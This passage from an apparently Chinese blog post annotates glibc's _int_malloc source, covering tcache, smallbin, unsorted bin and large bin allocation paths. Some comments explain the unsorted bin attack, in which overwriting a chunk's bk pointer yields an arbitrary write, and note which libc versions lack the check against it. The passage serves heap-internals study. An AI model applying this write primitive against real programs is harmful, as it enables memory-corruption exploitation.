tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//返回heap_ptr</span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来是smallbins,同样判断是否在smallbin的范围,如果在的话,根据下标寻找双向链表头指针,便利如果存在则返回</li>
<li>将其余同样大小的smallbin归入tcache,然后返回chunk指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>前面的都不符合的时候,到了这里,如果存在fastbin的话,合并所有的相邻fastbin,归入unsorted bin中</li>
<li>//达成成就,飞机上写blog</li>
<li>注意malloc_consolidate触发是在第一次初始化fastbin的时候和申请largebin的时候</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a "small" request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123; </span><br><span class="line">          bck = victim-&gt;bk;<span class="comment">//获取victim后项节点</span></span><br><span class="line">          size = chunksize (victim);<span class="comment">//获取victim的size</span></span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);<span class="comment">//根据size获取指向next chunk的指针</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ) <span class="comment">//判断大小是否大于minsize</span></span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid next size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<span class="comment">//判断nextchunk的prevsize是否为size</span></span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) <span class="comment">//判断bck的前一个chunk是不是victim</span></span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="comment">//判断nextchunk的previnuse位</span></span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="comment">//满足上面的检测后,匹配size,是否在smallbin的范围,注意这里判断的是是否仅有一个chunk在unsortedbin中,bck是头指针的下一个,bck指针是victim后项指针,这里判断bck是否为头指针,接下来判断size与nb+头长度的大小关系,若符合则进入分配阶段</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb; <span class="comment">//减去分配的大小</span></span><br><span class="line">              remainder = chunk_at_offset (victim, nb); <span class="comment">//指向下一个偏移的地方</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<span class="comment">//改写unsortedbin,也就是切割以后的值</span></span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<span class="comment">//形成双向链表</span></span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))<span class="comment">//切割后如果不在smallbin的范围内,则设置largebin的指针</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);<span class="comment">//设置一些标识位,返回指针</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);<span class="comment">//这里则是unsorted bin attack的部分,注意我这个版本的libc源码加入了对bck-&gt;fd的检测,2.28之前的版本应该都没有这个检测的,这里说的是当这个unsortedbin不满足分配的size等条件的时候,将这个堆块从unsorted bin中移除,这里如果覆写了victim的bk指针的话,执行这里的话,会导致将add的值写到victim的bk处,而[add + 0x10] = &amp;victim,即任意合法地址写mainarena + 88的值 </span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//恰好相等的时候直接设置inuse然后返回</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果victim是smallbin的范围,且不符合被切割的条件,则返回给对应的smallbin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//返还给large_bin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;<span class="comment">//unlink</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里是unsorted bin,当没有空闲堆块的时候,进入这里,便利unsortedbins,当unsortedbin中只有一个chunk切大小符合条件时,进行切割,然后return</li>
<li>若不符合,则将其从unsortedbin中移除到相应的smallbin和largebin中,即unsortedbin的攻击原理</li>
<li>若刚好相等,则设置头,然后返回</li>
<li>如果victim是smallbin的范围,且不符合被切割的条件,则返回给对应的smallbin</li>
<li>否则返还给large_bin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              